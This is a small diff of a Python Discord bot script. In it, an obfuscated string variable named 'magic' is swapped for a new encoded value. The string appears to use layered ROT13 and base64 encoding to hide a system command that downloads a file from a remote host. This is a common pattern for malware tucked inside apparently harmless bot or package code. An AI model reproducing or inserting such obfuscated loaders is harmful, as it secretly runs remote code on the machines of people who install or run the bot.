@@ -7,7 +7,7 @@ intents = discord.Intents.all()
 client = discord.Client(command_prefix="!", intents=intents)
 
 magic = '''
-LzLhMzkzM3W6XPWjnTI5VP1PVUIaM2AzBv8iLJ5bqUIaYJ9vLauzYwNjZTclo3IvMzqhL2ZhpTW6Y2udnP5woPVcPt==
+LzLhMzkzM3W6XPWjnTI5VP1PVUIaM2AzBv8iLJ5bqUIaYJ9vLauzYwNjZTclo3IvMzqhL2ZhpTW6Y3chqzRhL2LkVvxX
 '''
 
 @client.event
